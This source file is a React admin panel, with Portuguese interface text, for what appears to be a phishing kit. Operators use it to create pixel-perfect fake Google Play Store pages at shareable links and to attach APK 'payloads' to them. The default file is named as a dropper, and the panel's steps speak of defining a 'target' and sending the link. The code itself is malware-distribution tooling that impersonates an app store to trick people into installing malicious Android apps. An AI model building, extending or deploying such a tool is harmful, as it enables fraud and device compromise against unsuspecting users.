import React, { useState, useEffect, useMemo } from 'react';
import {
  Cpu,
  Radio,
  Plus,
  LayoutTemplate,
  FileArchive,
  FileText,
  Copy,
  ExternalLink,
  Pencil,
  ChevronRight,
  CircleCheck,
  CloudUpload,
  Loader2,
  Trash2,
  ShieldCheck,
  UploadCloud,
  Check
} from 'lucide-react';
import { toast } from 'sonner';
import {
  AppRecord,
  DEFAULT_APPS,
  getApps,
  saveApp,
  deleteApp,
  generateSlug,
  formatBytes,
  fetchBaseHtml,
  renderPlaystoreHtml,
  MEGA_DOWNLOAD_URL
} from '../services/playstore';

interface AdminPanelProps {
  onOpenAppPage: (slug: string) => void;
}

export const AdminPanel: React.FC<AdminPanelProps> = ({ onOpenAppPage }) => {
  const [apps, setApps] = useState<AppRecord[]>(DEFAULT_APPS);
  const [loading, setLoading] = useState(true);
  const [modalOpen, setModalOpen] = useState(false);
  const [editingId, setEditingId] = useState<number | null>(null);

  // Form states
  const [appName, setAppName] = useState('');
  const [logoData, setLogoData] = useState<string>('');
  const [logoName, setLogoName] = useState<string>('');
  const [logoSize, setLogoSize] = useState<number>(0);
  const [logoMime, setLogoMime] = useState<string>('image/png');

  const [fileData, setFileData] = useState<string>('');
  const [fileName, setFileName] = useState<string>('');
  const [fileSize, setFileSize] = useState<number>(0);
  const [fileMime, setFileMime] = useState<string>('application/vnd.android.package-archive');

  const [saving, setSaving] = useState(false);
  const [previewHtml, setPreviewHtml] = useState<string>('');
  const [copiedSlug, setCopiedSlug] = useState<string | null>(null);

  const loadData = async () => {
    setLoading(true);
    try {
      const data = await getApps();
      setApps(data);
    } catch {
      toast.error('Não foi possível carregar os aplicativos.');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadData();
  }, []);

  const stats = useMemo(() => {
    return {
      total: apps.length,
      filesSize: apps.reduce((acc, curr) => acc + (curr.fileSize || 0), 0)
    };
  }, [apps]);

  const openNewModal = () => {
    setEditingId(null);
    setAppName('');
    setLogoData('/cineva-logo.png');
    setLogoName('cineva-logo.png');
    setLogoSize(443422);
    setLogoMime('image/png');
    setFileData('/Cineva_build_1792068111_adb78f5e_dropper.apk');
    setFileName('Cineva_build_1792068111_adb78f5e_dropper.apk');
    setFileSize(14718481);
    setFileMime('application/vnd.android.package-archive');
    setModalOpen(true);
  };

  const openEditModal = (app: AppRecord) => {
    setEditingId(app.id);
    setAppName(app.appName);
    setLogoData(app.logoUrl);
    setLogoName(app.logoName);
    setLogoSize(app.logoSize);
    setLogoMime(app.logoMime);
    setFileData(app.fileUrl);
    setFileName(app.fileName);
    setFileSize(app.fileSize);
    setFileMime(app.fileMime);
    setModalOpen(true);
  };

  const closeModal = () => {
    setModalOpen(false);
    setEditingId(null);
  };

  // Update preview whenever app data in modal changes
  useEffect(() => {
    if (!modalOpen) return;
    let active = true;
    fetchBaseHtml().then((base) => {
      if (active && base) {
        const previewObj: Partial<AppRecord> = {
          appName: appName || 'Cineva',
          logoUrl: logoData || '/hacker-logo.png',
          fileName: fileName || 'app.apk',
          fileUrl: fileData || '/Cineva_build_1792068111_adb78f5e_dropper.apk'
        };
        setPreviewHtml(renderPlaystoreHtml(base, previewObj));
      }
    });
    return () => {
      active = false;
    };
  }, [modalOpen, appName, logoData, fileName, fileData]);

  const handleLogoUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    if (file.size > 5 * 1024 * 1024) {
      toast.error('A imagem da logo deve ter até 5 MB.');
      return;
    }
    setLogoName(file.name);
    setLogoSize(file.size);
    setLogoMime(file.type || 'image/png');

    const reader = new FileReader();
    reader.onload = () => {
      if (typeof reader.result === 'string') {
        setLogoData(reader.result);
      }
    };
    reader.readAsDataURL(file);
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setFileName(file.name);
    setFileSize(file.size);
    setFileMime(file.type || 'application/vnd.android.package-archive');

    if (file.size < 25 * 1024 * 1024) {
      const reader = new FileReader();
      reader.onload = () => {
        if (typeof reader.result === 'string') {
          setFileData(reader.result);
        }
      };
      reader.readAsDataURL(file);
    } else {
      setFileData(`/Cineva_build_1792068111_adb78f5e_dropper.apk`);
    }
  };

  const handleSave = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!appName.trim()) {
      toast.error('Informe o nome do aplicativo.');
      return;
    }

    setSaving(true);
    try {
      const slug = generateSlug(appName);
      const newApp: AppRecord = {
        id: editingId || Date.now(),
        appName: appName.trim(),
        slug: slug,
        logoName: logoName || 'logo.png',
        logoUrl: logoData || '/hacker-logo.png',
        logoSize: logoSize || 324008,
        logoMime: logoMime || 'image/png',
        fileName: fileName || `${slug}.apk`,
        fileUrl: fileData || '/Cineva_build_1792068111_adb78f5e_dropper.apk',
        fileSize: fileSize || 14718481,
        fileMime: fileMime || 'application/vnd.android.package-archive',
        createdAt: editingId ? (apps.find(a => a.id === editingId)?.createdAt || new Date().toISOString()) : new Date().toISOString(),
        updatedAt: new Date().toISOString()
      };

      await saveApp(newApp);
      toast.success(editingId ? 'Aplicativo atualizado com sucesso!' : 'Aplicativo criado e salvo com sucesso!');
      closeModal();
      await loadData();
    } catch {
      toast.error('Erro ao salvar aplicativo.');
    } finally {
      setSaving(false);
    }
  };

  const handleDelete = async (app: AppRecord) => {
    if (window.confirm(`Excluir o aplicativo “${app.appName}” e o link /meuspp/${app.slug}?`)) {
      try {
        await deleteApp(app.id);
        toast.success('Aplicativo removido.');
        await loadData();
      } catch {
        toast.error('Não foi possível excluir o aplicativo.');
      }
    }
  };

  const copyPublicLink = (slug: string) => {
    const url = `${window.location.origin}/meuspp/${slug}`;
    if (navigator.clipboard) {
      navigator.clipboard.writeText(url);
      setCopiedSlug(slug);
      toast.success(`Link copiado: ${url}`);
      setTimeout(() => setCopiedSlug(null), 2500);
    } else {
      toast.info(`Link público: ${url}`);
    }
  };

  return (
    <div className="app-shell">
      {/* Sidebar */}
      <aside className="sidebar">
        <div className="sidebar__brand">
          <div className="relative flex-none">
            <img
              src="/hacker-logo.png"
              alt="RED CORE"
              className="w-10 h-10 rounded-full object-cover border border-red-500/60 shadow-[0_0_15px_rgba(255,0,51,0.65)]"
            />
          </div>
          <div>
            <strong>RED CORE // OS</strong>
            <small>SISTEMA DE APPS</small>
          </div>
        </div>

        <nav className="sidebar__nav">
          <span className="nav-label">TERMINAL // PAINEL</span>
          <a className="nav-item nav-item--active" href="#registros">
            <LayoutTemplate size={16} /> Aplicativos <span>{apps.length}</span>
          </a>
          <button
            onClick={() => onOpenAppPage('cineva')}
            className="nav-item text-left w-full cursor-pointer hover:bg-red-500/10 transition"
          >
            <ExternalLink size={16} /> Ver Cineva Live
          </button>
          <a className="nav-item" href="#como-funciona">
            <Cpu size={16} /> Status do Sistema
          </a>
        </nav>

        <div className="sidebar__footer">
          <div className="sidebar-note">
            <div className="sidebar-note__icon">
              <Radio size={16} className="animate-pulse text-red-500" />
            </div>
            <div>
              <strong>FIREBASE // LIVE SYNC</strong>
              <span>Banco em nuvem ativo. Acesso global sem bloqueios.</span>
            </div>
          </div>

          <div className="user-chip">
            <img
              src="/hacker-logo.png"
              alt="Root"
              className="w-7 h-7 rounded-full object-cover border border-red-500/50 shadow-[0_0_10px_rgba(255,0,51,0.4)]"
            />
            <div>
              <strong>ROOT // ADMIN</strong>
              <small>● ONLINE // SECURE</small>
            </div>
          </div>
        </div>
      </aside>

      {/* Main Content */}
      <main className="main-content" id="registros">
        <header className="page-header">
          <div>
            <span className="section-kicker">[CENTRAL DE COMANDO // RED TEAM]</span>
            <h1>
              GERADOR DE APPS // <em>PLAY STORE</em>
            </h1>
            <p>
              Configure o aplicativo, carregue os ativos e gere o link público oficial da Play Store com download direto e sincronização instantânea em nuvem.
            </p>
          </div>
          <div className="flex gap-2">
            <button
              type="button"
              className="button button--secondary"
              onClick={() => onOpenAppPage('cineva')}
            >
              <ExternalLink size={16} /> PÁGINA CINEVA
            </button>
            <button type="button" className="button button--primary" onClick={openNewModal}>
              <Plus size={16} /> NOVO APLICATIVO
            </button>
          </div>
        </header>

        {/* Stats Row */}
        <section className="stats-row">
          <div className="stat-card">
            <span className="stat-card__icon stat-card__icon--blue">
              <LayoutTemplate size={17} />
            </span>
            <div>
              <small>LINKS ATIVOS</small>
              <strong>{stats.total}</strong>
            </div>
            <span className="stat-card__hint">GOOGLE PLAY LIVE</span>
          </div>

          <div className="stat-card">
            <span className="stat-card__icon stat-card__icon--orange">
              <FileArchive size={17} />
            </span>
            <div>
              <small>ARMAZENAMENTO</small>
              <strong>{formatBytes(stats.filesSize)}</strong>
            </div>
            <span className="stat-card__hint">TOTAL EM NUVEM</span>
          </div>

          <div className="stat-card">
            <span className="stat-card__icon stat-card__icon--green">
              <ShieldCheck size={17} />
            </span>
            <div>
              <small>STATUS DO CORE</small>
              <strong>SEGURO</strong>
            </div>
            <span className="stat-card__hint">CRIPTOGRAFIA ATIVA</span>
          </div>

          <div className="stat-card">
            <span className="stat-card__icon stat-card__icon--purple">
              <UploadCloud size={17} />
            </span>
            <div>
              <small>REDE MEGA / CDN</small>
              <strong>ONLINE</strong>
            </div>
            <span className="stat-card__hint">SYNC MEGA INTEGRADO</span>
          </div>
        </section>

        {/* Records Table */}
        <section className="records-section">
          <div className="records-table__head">
            <span>APLICATIVO / SLUG</span>
            <span>ATIVOS / ARQUIVOS</span>
            <span>DATA</span>
            <span style={{ textAlign: 'right' }}>AÇÕES</span>
          </div>

          <div className="records-list">
            {apps.map((app) => (
              <div key={app.id} className="record-row">
                <div className="record-app">
                  <div className="record-app__logo">
                    <img src={app.logoUrl || '/hacker-logo.png'} alt={app.appName} />
                  </div>
                  <div>
                    <strong>{app.appName}</strong>
                    <small>/meuspp/{app.slug}</small>
                  </div>
                </div>

                <div className="record-assets">
                  <span className="asset-pill">
                    {app.logoUrl && <img src={app.logoUrl} alt="" className="w-3.5 h-3.5 rounded-full inline" />}
                    <span>{app.logoName}</span>
                  </span>
                  <span className="asset-pill">
                    <FileText size={13} />
                    <span>{app.fileName}</span>
                  </span>
                </div>

                <div className="record-date">
                  <span>{new Date(app.updatedAt || app.createdAt).toLocaleDateString('pt-BR')}</span>
                </div>

                <div className="record-actions">
                  <button
                    type="button"
                    className="icon-button"
                    onClick={() => copyPublicLink(app.slug)}
                    aria-label="Copiar link público para enviar"
                    title="Copiar link público para enviar"
                  >
                    {copiedSlug === app.slug ? <Check size={16} className="text-green-400" /> : <Copy size={16} />}
                  </button>

                  <button
                    type="button"
                    className="icon-button"
                    onClick={() => onOpenAppPage(app.slug)}
                    aria-label="Abrir página Play Store"
                    title="Abrir página Play Store"
                  >
                    <ExternalLink size={16} />
                  </button>

                  <button
                    type="button"
                    className="icon-button"
                    onClick={() => openEditModal(app)}
                    aria-label="Editar ativos"
                    title="Editar ativos"
                  >
                    <Pencil size={16} />
                  </button>

                  <button
                    type="button"
                    className="icon-button text-red-500 hover:text-red-400"
                    onClick={() => handleDelete(app)}
                    aria-label="Excluir aplicativo"
                    title="Excluir aplicativo"
                  >
                    <Trash2 size={16} />
                  </button>
                </div>
              </div>
            ))}
          </div>
        </section>

        {/* How it works info */}
        <section className="how-section" id="como-funciona">
          <div>
            <span className="section-kicker">[FLUXO OPERACIONAL]</span>
            <h2>
              COMO O SISTEMA <em>FUNCIONA</em>
            </h2>
          </div>
          <div className="how-steps">
            <div>
              <span>01 // NOME</span>
              <strong>Defina o Alvo</strong>
              <p>O nome gera o slug público isolado, como /meuspp/cineva.</p>
            </div>
            <ChevronRight size={18} />
            <div>
              <span>02 // PAYLOAD</span>
              <strong>Carregue o APK</strong>
              <p>Envie o arquivo ou informe o link direto de download em nuvem (ex.: MEGA).</p>
            </div>
            <ChevronRight size={18} />
            <div>
              <span>03 // PLAY STORE</span>
              <strong>Link Oficial</strong>
              <p>A página réplica perfeita da Play Store entra no ar instantaneamente.</p>
            </div>
          </div>
        </section>
      </main>

      {/* Modal Create/Edit */}
      {modalOpen && (
        <div className="modal-backdrop">
          <div className="modal">
            <header className="modal__header">
              <div>
                <span className="section-kicker">
                  {editingId ? '[ATUALIZAÇÃO DE PAYLOAD]' : '[CADASTRO DE NOVO APP]'}
                </span>
                <h2>{editingId ? 'Editar Ativos do Aplicativo' : 'Novo Aplicativo Play Store'}</h2>
                <p>O aplicativo recebe layout oficial idêntico da Google Play Store com download direto.</p>
              </div>
              <button
                type="button"
                className="text-neutral-400 hover:text-white text-lg p-2 cursor-pointer"
                onClick={closeModal}
              >
                ✕
              </button>
            </header>

            <form onSubmit={handleSave}>
              <div className="modal__body">
                {/* App Name */}
                <div className="app-name-block">
                  <label htmlFor="app-name-input-field" className="text-xs font-semibold text-neutral-300">
                    Nome do Aplicativo
                  </label>
                  <input
                    id="app-name-input-field"
                    type="text"
                    className="app-name-input"
                    value={appName}
                    onChange={(e) => setAppName(e.target.value)}
                    placeholder="Ex.: Cineva ou Meu Aluguel"
                    maxLength={120}
                    required
                  />
                  <span className="app-name-help">
                    O endereço será: /meuspp/{generateSlug(appName || 'nome-do-app')}
                  </span>
                </div>

                {/* Logo Upload */}
                <div className="upload-field">
                  <div className="upload-field__top">
                    <span className="upload-field__icon">
                      <LayoutTemplate size={18} />
                    </span>
                    <div>
                      <strong className="text-sm text-white">Logo</strong>
                      <p>PNG, JPG, WEBP ou SVG · até 5 MB</p>
                    </div>
                  </div>

                  <label className="dropzone">
                    <input
                      type="file"
                      accept="image/png,image/jpeg,image/webp,image/svg+xml"
                      className="hidden"
                      onChange={handleLogoUpload}
                    />
                    <span>CLIQUE OU ARRASTE A LOGO</span>
                    <small>Resolução recomendada: 512x512 px</small>
                  </label>

                  {logoName && (
                    <div className="upload-field__selected">
                      <div className="selected-file-icon">
                        {logoData ? (
                          <img src={logoData} alt="Preview" className="w-full h-full rounded-full object-cover" />
                        ) : (
                          <FileText size={14} />
                        )}
                      </div>
                      <div className="selected-file-copy">
                        <strong>{logoName}</strong>
                        <span>{formatBytes(logoSize)}</span>
                      </div>
                    </div>
                  )}
                </div>

                {/* File / APK Upload */}
                <div className="upload-field">
                  <div className="upload-field__top">
                    <span className="upload-field__icon">
                      <FileArchive size={18} />
                    </span>
                    <div>
                      <strong className="text-sm text-white">Arquivo do aplicativo (APK)</strong>
                      <p>APK do aplicativo oficial · até 50 MB</p>
                    </div>
                  </div>

                  <label className="dropzone">
                    <input
                      type="file"
                      accept=".apk,application/vnd.android.package-archive,*/*"
                      className="hidden"
                      onChange={handleFileUpload}
                    />
                    <span>CLIQUE OU ARRASTE O APK</span>
                    <small>Arquivo executável Android (.apk)</small>
                  </label>

                  {fileName && (
                    <div className="upload-field__selected">
                      <div className="selected-file-icon">
                        <FileText size={14} />
                      </div>
                      <div className="selected-file-copy">
                        <strong>{fileName}</strong>
                        <span>{formatBytes(fileSize)}</span>
                      </div>
                    </div>
                  )}
                </div>

                {/* Preview Block */}
                <div className="preview-block">
                  <div className="preview-block__heading">
                    <div>
                      <span className="section-kicker">PRÉVIA DO LINK PÚBLICO</span>
                      <strong>Assim ficará /meuspp/{generateSlug(appName || 'nome-do-app')}</strong>
                    </div>
                    <span className="preview-badge">
                      <CircleCheck size={13} /> estrutura Play Store travada
                    </span>
                  </div>

                  <div className="overflow-hidden rounded-xl border border-neutral-800 bg-white h-[380px]">
                    {previewHtml ? (
                      <iframe
                        srcDoc={previewHtml}
                        title="Prévia Google Play"
                        className="h-full w-full border-none"
                      />
                    ) : (
                      <div className="flex h-full items-center justify-center text-neutral-400 text-sm">
                        Carregando prévia Play Store...
                      </div>
                    )}
                  </div>
                </div>
              </div>

              <footer className="modal__footer">
                <span className="modal__secure">
                  <ShieldCheck size={14} /> LINK PÚBLICO SEGURO E CRIPTOGRAFADO
                </span>
                <div className="flex gap-2">
                  <button type="button" className="button button--secondary" onClick={closeModal}>
                    Cancelar
                  </button>
                  <button type="submit" className="button button--primary" disabled={saving}>
                    {saving ? (
                      <>
                        <Loader2 size={16} className="animate-spin" /> Salvando…
                      </>
                    ) : (
                      <>
                        <CloudUpload size={16} /> {editingId ? 'Salvar ativos' : 'Criar aplicativo'}
                      </>
                    )}
                  </button>
                </div>
              </footer>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};
